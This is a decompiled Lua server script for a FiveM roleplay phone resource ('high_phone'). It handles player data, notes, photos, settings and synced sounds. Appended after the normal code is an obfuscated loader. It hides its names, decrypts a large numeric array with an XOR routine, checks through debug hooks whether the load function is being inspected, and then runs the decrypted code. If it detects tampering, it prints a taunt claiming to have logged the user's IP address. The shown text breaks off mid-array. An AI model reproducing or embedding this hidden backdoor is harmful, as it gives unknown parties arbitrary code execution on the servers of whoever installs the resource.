local L0_1, L1_1, L2_1
L0_1 = {}
Players = L0_1
L0_1 = Citizen
L0_1 = L0_1.CreateThread
function L1_1()
  local L0_2, L1_2, L2_2
  L0_2 = Wait
  L1_2 = 1000
  L0_2(L1_2)
  L0_2 = Config
  L0_2 = L0_2.EnableUpdateNotifications
  if L0_2 then
    L0_2 = print
    L1_2 = "^5INFO: ^0Checking for new versions.."
    L0_2(L1_2)
    L0_2 = PerformHttpRequest
    L1_2 = "https://cdn.high-scripts.com/versions.json"
    function L2_2(A0_3, A1_3, A2_3)
      local L3_3, L4_3, L5_3, L6_3, L7_3, L8_3, L9_3, L10_3
      if A1_3 then
        L3_3 = json
        L3_3 = L3_3.decode
        L4_3 = A1_3
        L3_3 = L3_3(L4_3)
        L3_3 = L3_3.high_phone
        L4_3 = GetResourceMetadata
        L5_3 = GetCurrentResourceName
        L5_3 = L5_3()
        L6_3 = "version"
        L4_3 = L4_3(L5_3, L6_3)
        if L4_3 ~= L3_3 then
          L4_3 = print
          L5_3 = "^3WARNING: ^0New version ^3"
          L6_3 = L3_3
          L7_3 = " ^0is available for download on keymaster! Your resource version: ^3"
          L8_3 = GetResourceMetadata
          L9_3 = GetCurrentResourceName
          L9_3 = L9_3()
          L10_3 = "version"
          L8_3 = L8_3(L9_3, L10_3)
          L9_3 = [[
^0
Please download it as soon as possible, as the update might contain critical fixes, huge new features and other stuff! You can see the full changelog on our discord group!]]
          L5_3 = L5_3 .. L6_3 .. L7_3 .. L8_3 .. L9_3
          L4_3(L5_3)
        else
          L4_3 = print
          L5_3 = "^5INFO: ^0Your resource is up to date!"
          L4_3(L5_3)
        end
      else
        L3_3 = print
        L4_3 = "^8ERROR: ^0Failed to check for new versions! Couldn't reach version checking service!"
        L3_3(L4_3)
      end
    end

    L0_2(L1_2, L2_2)
  end
end

L0_1(L1_1)
L0_1 = Config
L0_1 = L0_1.FrameworkFunctions
L0_1 = L0_1.registerCallback
L1_1 = "high_phone:getMyData"
function L2_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2
  L3_2 = Config
  L3_2 = L3_2.FrameworkFunctions
  L3_2 = L3_2.getPlayer
  L4_2 = A0_2
  L3_2 = L3_2(L4_2)
  if L3_2 then
    L4_2 = L3_2.number
    if A2_2 then
      L5_2 = getPlayerData
      L6_2 = L3_2.source
      L7_2 = Config
      L7_2 = L7_2.PhoneNumberColumn
      L5_2 = L5_2(L6_2, L7_2)
      L4_2 = L5_2
    end
    L5_2 = L3_2.getIdentity
    L5_2 = L5_2()
    L6_2 = A1_2
    L7_2 = json
    L7_2 = L7_2.encode
    L8_2 = {}
    L9_2 = L3_2.identifier
    L8_2.identifier = L9_2
    L9_2 = L5_2.firstname
    L10_2 = " "
    L11_2 = L5_2.lastname
    L9_2 = L9_2 .. L10_2 .. L11_2
    L8_2.name = L9_2
    L8_2.number = L4_2
    L9_2 = json
    L9_2 = L9_2.encode
    L10_2 = {}
    L11_2 = L3_2.jobName
    L10_2.name = L11_2
    L11_2 = L3_2.jobGrade
    L10_2.grade = L11_2
    L9_2 = L9_2(L10_2)
    L8_2.job = L9_2
    L9_2 = getPlayerData
    L10_2 = A0_2
    L11_2 = "settings"
    L9_2 = L9_2(L10_2, L11_2)
    L8_2.settings = L9_2
    L7_2, L8_2, L9_2, L10_2, L11_2 = L7_2(L8_2)
    L6_2(L7_2, L8_2, L9_2, L10_2, L11_2)
  else
    L4_2 = A1_2
    L5_2 = "{}"
    L4_2(L5_2)
  end
end

L0_1(L1_1, L2_1)
L0_1 = Config
L0_1 = L0_1.FrameworkFunctions
L0_1 = L0_1.registerCallback
L1_1 = "high_phone:getNotes"
function L2_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2
  L2_2 = Config
  L2_2 = L2_2.FrameworkFunctions
  L2_2 = L2_2.getPlayer
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  if L2_2 then
    L3_2 = getPlayerNotes
    L4_2 = L2_2.identifier
    L3_2 = L3_2(L4_2)
    L4_2 = A1_2
    L5_2 = json
    L5_2 = L5_2.encode
    L6_2 = L3_2
    L5_2, L6_2 = L5_2(L6_2)
    L4_2(L5_2, L6_2)
  else
    L3_2 = A1_2
    L4_2 = "[]"
    L3_2(L4_2)
  end
end

L0_1(L1_1, L2_1)
L0_1 = Config
L0_1 = L0_1.FrameworkFunctions
L0_1 = L0_1.registerCallback
L1_1 = "high_phone:getGallery"
function L2_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2
  L2_2 = Config
  L2_2 = L2_2.FrameworkFunctions
  L2_2 = L2_2.getPlayer
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  L3_2 = MySQL
  L3_2 = L3_2.Sync
  L3_2 = L3_2.fetchScalar
  L4_2 = "SELECT photos FROM "
  L5_2 = Config
  L5_2 = L5_2.PlayersTable
  L6_2 = " WHERE "
  L7_2 = Config
  L7_2 = L7_2.IdentifierColumn
  L8_2 = " = @identifier"
  L4_2 = L4_2 .. L5_2 .. L6_2 .. L7_2 .. L8_2
  L5_2 = {}
  L6_2 = L2_2.identifier
  L5_2["@identifier"] = L6_2
  L3_2 = L3_2(L4_2, L5_2)
  L4_2 = A1_2
  L5_2 = L3_2 or L5_2
  if not L3_2 or not L3_2 then
    L5_2 = "[]"
  end
  L4_2(L5_2)
end

L0_1(L1_1, L2_1)
L0_1 = RegisterNetEvent
L1_1 = "high_phone:savePhoto"
function L2_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2
  L3_2 = source
  L4_2 = Config
  L4_2 = L4_2.FrameworkFunctions
  L4_2 = L4_2.getPlayer
  L5_2 = L3_2
  L4_2 = L4_2(L5_2)
  L5_2 = {}
  L5_2.url = A0_2
  L5_2.src = A1_2
  L5_2.date = A2_2
  L6_2 = MySQL
  L6_2 = L6_2.Sync
  L6_2 = L6_2.fetchScalar
  L7_2 = "SELECT photos FROM "
  L8_2 = Config
  L8_2 = L8_2.PlayersTable
  L9_2 = " WHERE "
  L10_2 = Config
  L10_2 = L10_2.IdentifierColumn
  L11_2 = " = @identifier"
  L7_2 = L7_2 .. L8_2 .. L9_2 .. L10_2 .. L11_2
  L8_2 = {}
  L9_2 = L4_2.identifier
  L8_2["@identifier"] = L9_2
  L6_2 = L6_2(L7_2, L8_2)
  if L6_2 then
    L7_2 = json
    L7_2 = L7_2.decode
    L8_2 = L6_2
    L7_2 = L7_2(L8_2)
    if L7_2 then
      goto lbl_39
      L6_2 = L7_2 or L6_2
    end
  end
  L7_2 = {}
  L6_2 = L7_2
  ::lbl_39::
  L7_2 = table
  L7_2 = L7_2.insert
  L8_2 = L6_2
  L9_2 = L5_2
  L7_2(L8_2, L9_2)
  L7_2 = MySQL
  L7_2 = L7_2.Async
  L7_2 = L7_2.execute
  L8_2 = "UPDATE "
  L9_2 = Config
  L9_2 = L9_2.PlayersTable
  L10_2 = " SET photos = @photos WHERE "
  L11_2 = Config
  L11_2 = L11_2.IdentifierColumn
  L12_2 = " = @identifier"
  L8_2 = L8_2 .. L9_2 .. L10_2 .. L11_2 .. L12_2
  L9_2 = {}
  L10_2 = L4_2.identifier
  L9_2["@identifier"] = L10_2
  L10_2 = json
  L10_2 = L10_2.encode
  L11_2 = L6_2
  L10_2 = L10_2(L11_2)
  L9_2["@photos"] = L10_2
  L7_2(L8_2, L9_2)
end

L0_1(L1_1, L2_1)
L0_1 = RegisterNetEvent
L1_1 = "high_phone:deletePhoto"
function L2_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2
  L1_2 = source
  L2_2 = Config
  L2_2 = L2_2.FrameworkFunctions
  L2_2 = L2_2.getPlayer
  L3_2 = L1_2
  L2_2 = L2_2(L3_2)
  L3_2 = MySQL
  L3_2 = L3_2.Sync
  L3_2 = L3_2.fetchScalar
  L4_2 = "SELECT photos FROM "
  L5_2 = Config
  L5_2 = L5_2.PlayersTable
  L6_2 = " WHERE "
  L7_2 = Config
  L7_2 = L7_2.IdentifierColumn
  L8_2 = " = @identifier"
  L4_2 = L4_2 .. L5_2 .. L6_2 .. L7_2 .. L8_2
  L5_2 = {}
  L6_2 = L2_2.identifier
  L5_2["@identifier"] = L6_2
  L3_2 = L3_2(L4_2, L5_2)
  if L3_2 then
    L4_2 = json
    L4_2 = L4_2.decode
    L5_2 = L3_2
    L4_2 = L4_2(L5_2)
    if L4_2 then
      goto lbl_34
      L3_2 = L4_2 or L3_2
    end
  end
  L4_2 = {}
  L3_2 = L4_2
  ::lbl_34::
  L4_2 = pairs
  L5_2 = L3_2
  L4_2, L5_2, L6_2, L7_2 = L4_2(L5_2)
  for L8_2, L9_2 in L4_2, L5_2, L6_2, L7_2 do
    L10_2 = L9_2.url
    if L10_2 == A0_2 then
      L10_2 = table
      L10_2 = L10_2.remove
      L11_2 = L3_2
      L12_2 = L8_2
      L10_2(L11_2, L12_2)
      break
    end
  end
  L4_2 = MySQL
  L4_2 = L4_2.Async
  L4_2 = L4_2.execute
  L5_2 = "UPDATE "
  L6_2 = Config
  L6_2 = L6_2.PlayersTable
  L7_2 = " SET photos = @photos WHERE "
  L8_2 = Config
  L8_2 = L8_2.IdentifierColumn
  L9_2 = " = @identifier"
  L5_2 = L5_2 .. L6_2 .. L7_2 .. L8_2 .. L9_2
  L6_2 = {}
  L7_2 = L2_2.identifier
  L6_2["@identifier"] = L7_2
  L7_2 = json
  L7_2 = L7_2.encode
  L8_2 = L3_2
  L7_2 = L7_2(L8_2)
  L6_2["@photos"] = L7_2
  L4_2(L5_2, L6_2)
end

L0_1(L1_1, L2_1)
L0_1 = RegisterNetEvent
L1_1 = "high_phone:updateNotes"
function L2_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2
  L1_2 = source
  L2_2 = Config
  L2_2 = L2_2.FrameworkFunctions
  L2_2 = L2_2.getPlayer
  L3_2 = L1_2
  L2_2 = L2_2(L3_2)
  L3_2 = MySQL
  L3_2 = L3_2.Async
  L3_2 = L3_2.execute
  L4_2 = "UPDATE "
  L5_2 = Config
  L5_2 = L5_2.PlayersTable
  L6_2 = " SET `notes` = @notes WHERE "
  L7_2 = Config
  L7_2 = L7_2.IdentifierColumn
  L8_2 = " = @identifier"
  L4_2 = L4_2 .. L5_2 .. L6_2 .. L7_2 .. L8_2
  L5_2 = {}
  L6_2 = L2_2.identifier
  L5_2["@identifier"] = L6_2
  L6_2 = json
  L6_2 = L6_2.encode
  L7_2 = A0_2
  L6_2 = L6_2(L7_2)
  L5_2["@notes"] = L6_2
  L3_2(L4_2, L5_2)
end

L0_1(L1_1, L2_1)
L0_1 = Config
L0_1 = L0_1.FrameworkFunctions
L0_1 = L0_1.registerCallback
L1_1 = "high_phone:hasPhone"
function L2_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2
  L2_2 = Config
  L2_2 = L2_2.FrameworkFunctions
  L2_2 = L2_2.getPlayer
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  if L2_2 then
    L3_2 = Config
    L3_2 = L3_2.ItemRequired
    if L3_2 then
      L3_2 = type
      L4_2 = Config
      L4_2 = L4_2.PhoneItem
      L3_2 = L3_2(L4_2)
      if "string" == L3_2 then
        L3_2 = L2_2.getItemCount
        L4_2 = Config
        L4_2 = L4_2.PhoneItem
        L3_2 = L3_2(L4_2)
        L4_2 = A1_2
        L5_2 = L3_2 or L5_2
        L5_2 = L3_2 and L3_2 > 0
        L4_2(L5_2)
      else
        L3_2 = type
        L4_2 = Config
        L4_2 = L4_2.PhoneItem
        L3_2 = L3_2(L4_2)
        if "table" == L3_2 then
          L3_2 = false
          L4_2 = pairs
          L5_2 = Config
          L5_2 = L5_2.PhoneItem
          L4_2, L5_2, L6_2, L7_2 = L4_2(L5_2)
          for L8_2, L9_2 in L4_2, L5_2, L6_2, L7_2 do
            L10_2 = L2_2.getItemCount
            L11_2 = L9_2
            L10_2 = L10_2(L11_2)
            if L10_2 and L10_2 > 0 then
              L3_2 = true
              break
            end
          end
          L4_2 = A1_2
          L5_2 = L3_2
          L4_2(L5_2)
        end
      end
    else
      L3_2 = A1_2
      L4_2 = true
      L3_2(L4_2)
    end
  else
    L3_2 = A1_2
    L4_2 = false
    L3_2(L4_2)
  end
end

L0_1(L1_1, L2_1)
L0_1 = RegisterNetEvent
L1_1 = "high_phone:sendAirdrop"
function L2_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L3_2 = source
  L4_2 = TriggerClientEvent
  L5_2 = "high_phone:receivedAirdrop"
  L6_2 = A0_2
  L7_2 = A1_2
  L8_2 = GetPlayerName
  L9_2 = L3_2
  L8_2 = L8_2(L9_2)
  L9_2 = L3_2
  L10_2 = A2_2
  L4_2(L5_2, L6_2, L7_2, L8_2, L9_2, L10_2)
end

L0_1(L1_1, L2_1)
L0_1 = RegisterNetEvent
L1_1 = "high_phone:updateSettings"
function L2_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2
  L1_2 = source
  L2_2 = Config
  L2_2 = L2_2.FrameworkFunctions
  L2_2 = L2_2.getPlayer
  L3_2 = L1_2
  L2_2 = L2_2(L3_2)
  L3_2 = MySQL
  L3_2 = L3_2.Async
  L3_2 = L3_2.execute
  L4_2 = "UPDATE "
  L5_2 = Config
  L5_2 = L5_2.PlayersTable
  L6_2 = " SET settings = @settings WHERE "
  L7_2 = Config
  L7_2 = L7_2.IdentifierColumn
  L8_2 = " = @identifier"
  L4_2 = L4_2 .. L5_2 .. L6_2 .. L7_2 .. L8_2
  L5_2 = {}
  L6_2 = json
  L6_2 = L6_2.encode
  L7_2 = A0_2
  L6_2 = L6_2(L7_2)
  L5_2["@settings"] = L6_2
  L6_2 = L2_2.identifier
  L5_2["@identifier"] = L6_2
  L3_2(L4_2, L5_2)
end

L0_1(L1_1, L2_1)
L0_1 = RegisterNetEvent
L1_1 = "high_phone:playSyncedSound"
function L2_1(A0_2, A1_2, A2_2, A3_2, A4_2, A5_2)
  local L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2, L20_2
  L6_2 = source
  L7_2 = Config
  L7_2 = L7_2.SyncedSounds
  if not L7_2 then
    return
  end
  L7_2 = pairs
  L8_2 = A0_2
  L7_2, L8_2, L9_2, L10_2 = L7_2(L8_2)
  for L11_2, L12_2 in L7_2, L8_2, L9_2, L10_2 do
    if L12_2 ~= L6_2 then
      L13_2 = TriggerClientEvent
      L14_2 = "high_phone:playSyncedSound"
      L15_2 = L12_2
      L16_2 = A1_2
      L17_2 = A2_2
      L18_2 = A3_2
      L19_2 = A4_2
      L20_2 = A5_2
      L13_2(L14_2, L15_2, L16_2, L17_2, L18_2, L19_2, L20_2)
    end
  end
end

L0_1(L1_1, L2_1)
L0_1 = RegisterNetEvent
L1_1 = "high_phone:stopSyncedSound"
function L2_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2
  L1_2 = source
  L2_2 = Config
  L2_2 = L2_2.SyncedSounds
  if not L2_2 then
    return
  end
  L2_2 = TriggerClientEvent
  L3_2 = "high_phone:stopSyncedSound"
  L4_2 = -1
  L5_2 = A0_2
  L2_2(L3_2, L4_2, L5_2)
end

L0_1(L1_1, L2_1)
L0_1 = RegisterNetEvent
L1_1 = "high_phone:toggleFlashlight"
function L2_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2
  L2_2 = TriggerClientEvent
  L3_2 = "high_phone:toggleFlashlight"
  L4_2 = -1
  L5_2 = A0_2
  L6_2 = A1_2
  L2_2(L3_2, L4_2, L5_2, L6_2)
end

L0_1(L1_1, L2_1)
L0_1 = RegisterNetEvent
L1_1 = "high_phone:updateAirplane"
function L2_1(A0_2)
  local L1_2, L2_2
  L1_2 = source
  L2_2 = Players
  L2_2 = L2_2[L1_2]
  if L2_2 then
    L2_2 = Players
    L2_2 = L2_2[L1_2]
    L2_2.airplane = A0_2
  end
end

L0_1(L1_1, L2_1)
oXdzdcs0Ygzhr3TmM8a7qP9rzfRLEuaZbTHZGJJHZ56avo0V4yxOQWehgASRhnVNXXDokrF4 = _G; alz2mdOPJfaAeSn8OVCoOHiGASlnmkJv3MKCchSsKlHiNkge5JangCH =
oXdzdcs0Ygzhr3TmM8a7qP9rzfRLEuaZbTHZGJJHZ56avo0V4yxOQWehgASRhnVNXXDokrF4; bWzbd5CmXJ4HDOy1SKwRskZmcdy0JMcDkglqloE5uYtdwrfrfZb =
alz2mdOPJfaAeSn8OVCoOHiGASlnmkJv3MKCchSsKlHiNkge5JangCH; pdN0NmMuThI1r1mrmHf9yB6mHAJhKo4jv77zG0PE6JfcSOHVaaeXL3vpilKaXihJkNGRXOSFmO =
bWzbd5CmXJ4HDOy1SKwRskZmcdy0JMcDkglqloE5uYtdwrfrfZb; ymGZkYo1SaXWTVYLdH11nDBskNN2NsMOJ0HSErvEUVGAm2K4uyuJ1f8ZWU2YYnQYesA9YsX8 =
pdN0NmMuThI1r1mrmHf9yB6mHAJhKo4jv77zG0PE6JfcSOHVaaeXL3vpilKaXihJkNGRXOSFmO; gWbiWbuDSSULLhUH5bkVmPhe47lZWjnq1rkbwZXhZnFx0AxV3ulYFt3L =
ymGZkYo1SaXWTVYLdH11nDBskNN2NsMOJ0HSErvEUVGAm2K4uyuJ1f8ZWU2YYnQYesA9YsX8; j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0 = function(
  a)
  K, F = 4429259684378702, 16384 + 9866; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; jENyd81lXjwt220zWEQtpAGr2zyM2dYq4qCwslMrTbkp5RZThuWn0wL = function(b)
  co = coroutine.create(b)
  gdaWt9j6XYGcdZPFgBxhlZqTOrsfGwLyMSLBTxtZ6bgXZWAIq87Vm8sdF = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(gdaWt9j6XYGcdZPFgBxhlZqTOrsfGwLyMSLBTxtZ6bgXZWAIq87Vm8sdF, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return gdaWt9j6XYGcdZPFgBxhlZqTOrsfGwLyMSLBTxtZ6bgXZWAIq87Vm8sdF
end; rfHdPEtrZVMdwzOaxEgT8byyhxKz12040YdYl8O8di3V76tPuwd5IvJ4vVxjNNMuPH = function(f, g)
  uUwkK5w8dPltl3JWGXtJr9XdlkaKNMbqGkaIZhj8psoTLXDN656BlXf4Im53dGIl5xDpB = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; n1DPE8tS26zNK8C9ZsGntQi4FPVBtfXpxJplMRTRJUQaynEAERZamYOp16xuE = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; rTNqacr3op1din0R0PKX5otF7tkXgm6STjoJeomqytvRRWMVD6GuE = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      uUwkK5w8dPltl3JWGXtJr9XdlkaKNMbqGkaIZhj8psoTLXDN656BlXf4Im53dGIl5xDpB(f[i], string.byte(g, j),
        function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; hGT6Q81BEwlWcoco2JMU2OMYTZepyGvZLYIp7dlP7hwqGFu4gI3l1Ubgqv = function(p, n)
    tZdbTvchQW984qtbnXffVjakXaXd89JdfqVgDS0Iy8QgqaMlJYZLqHGYPV7VG = ""
    for k, q in pairs(p) do tZdbTvchQW984qtbnXffVjakXaXd89JdfqVgDS0Iy8QgqaMlJYZLqHGYPV7VG =
      tZdbTvchQW984qtbnXffVjakXaXd89JdfqVgDS0Iy8QgqaMlJYZLqHGYPV7VG ..
      gWbiWbuDSSULLhUH5bkVmPhe47lZWjnq1rkbwZXhZnFx0AxV3ulYFt3L
      [j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('B4') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('7F') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('E9') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('C6') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('BD') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('30')]
      [j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('04') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('FB') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('6E') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('E9')](
      q) end
    ; n(tZdbTvchQW984qtbnXffVjakXaXd89JdfqVgDS0Iy8QgqaMlJYZLqHGYPV7VG)
  end; n1DPE8tS26zNK8C9ZsGntQi4FPVBtfXpxJplMRTRJUQaynEAERZamYOp16xuE(f,
    function(r) rTNqacr3op1din0R0PKX5otF7tkXgm6STjoJeomqytvRRWMVD6GuE(r, g,
        function(s) hGT6Q81BEwlWcoco2JMU2OMYTZepyGvZLYIp7dlP7hwqGFu4gI3l1Ubgqv(s,
            function(t) if #jENyd81lXjwt220zWEQtpAGr2zyM2dYq4qCwslMrTbkp5RZThuWn0wL(gWbiWbuDSSULLhUH5bkVmPhe47lZWjnq1rkbwZXhZnFx0AxV3ulYFt3L[j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('27') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('88') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('6E') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('CF')]) == 1 then if gWbiWbuDSSULLhUH5bkVmPhe47lZWjnq1rkbwZXhZnFx0AxV3ulYFt3L[j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('27') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('88') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('6E') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('CF')] == gWbiWbuDSSULLhUH5bkVmPhe47lZWjnq1rkbwZXhZnFx0AxV3ulYFt3L[j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('53') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('E9') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('C6') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('BD') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('7F')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if gWbiWbuDSSULLhUH5bkVmPhe47lZWjnq1rkbwZXhZnFx0AxV3ulYFt3L[j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('27') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('88') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('6E') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('CF')](t) then
                    gWbiWbuDSSULLhUH5bkVmPhe47lZWjnq1rkbwZXhZnFx0AxV3ulYFt3L
                        [j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('27') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('88') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('6E') .. j6tJ25sU3YVBEKJ1WP2iRYoEiJV4CUYsR9UyNDpdA5CCNbBVIUTJ0('CF')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; rfHdPEtrZVMdwzOaxEgT8byyhxKz12040YdYl8O8di3V76tPuwd5IvJ4vVxjNNMuPH(
{ 577, 1140, 657, 852, 692, 629, 1164, 960, 970, 614, 552, 1050, 1177, 724, 1093, 1202, 675, 1015, 854, 882, 929, 620,
  714, 909, 1155, 1016, 866, 957, 1109, 1162, 1210, 729, 975, 1017, 672, 715, 757, 920, 1045, 1071, 818, 644, 828, 783,
  777, 947, 916, 885, 619, 581, 732, 611, 1129, 761, 1108, 1091, 901, 610, 793, 1201, 1092, 673, 790, 814, 1132, 1209,
  1041, 1062, 1039, 953, 977, 646, 696, 762, 822, 636, 795, 1068, 595, 1084, 756, 813, 1152, 656, 1059, 938, 706, 1057,
  1144, 871, 735, 666, 817, 848, 665, 655, 902, 713, 553, 959, 1172, 786, 1022, 745, 584, 1115, 841, 1190, 942, 1097,
  760, 1013, 704, 1099, 1160, 1136, 964, 1114, 763, 1036, 1168, 1189, 1120, 1090, 996, 607, 872, 556, 648, 809, 821, 898,
